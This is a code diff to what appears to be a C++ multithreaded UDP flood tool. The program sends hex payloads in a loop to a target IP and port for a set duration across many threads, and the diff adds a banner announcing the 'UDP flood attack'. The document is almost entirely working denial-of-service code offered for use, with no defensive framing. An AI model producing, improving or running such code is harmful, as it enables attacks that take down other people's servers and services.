@@ -14,7 +14,7 @@
 // Array of payloads
 const char* payloads[] = {
     "\x08\xb2\x00\x21",
-    "\x08\xb2\x00\",
+    "\x08\xb2\x00",
     "\xD8\x39\x84\x00", 
 };
 
@@ -37,10 +37,8 @@ void send_udp_message(const std::string& ip, int port, bool& stop_flag) {
 
     while (!stop_flag) {
         for (int i = 0; i < num_payloads; ++i) {
-            // Send each payload
             ssize_t bytes_sent = sendto(sockfd, payloads[i], strlen(payloads[i]), 0, (const struct sockaddr*)&server_addr, sizeof(server_addr));
 
-            // Error handling if sendto fails
             if (bytes_sent == -1) {
                 std::cerr << "Error sending payload " << i + 1 << ": " << strerror(errno) << "\n";
             }
@@ -49,7 +47,6 @@ void send_udp_message(const std::string& ip, int port, bool& stop_flag) {
     close(sockfd);
 }
 
-// Function to be executed by each thread
 void udp_flood_thread(const std::string& ip, int port, bool& stop_flag) {
     send_udp_message(ip, port, stop_flag);
 }
@@ -66,6 +63,12 @@ int main(int argc, char* argv[]) {
     const int thread_count = std::stoi(argv[4]); 
 
     srand(time(0));  // Seed for random number generation (not needed for hex payloads but kept for consistency)
+    
+
+    std::cout << "Starting UDP flood attack on " << ip << ":" << port << " for " << duration << " seconds with " << thread_count << " threads.\n";
+
+    // Spawn multiple threads to send UDP payloads simultaneously
+    // The stop_flag is used to stop all threads when the attack duration is reache
 
     std::vector<std::thread> threads;
     bool stop_flag = false;
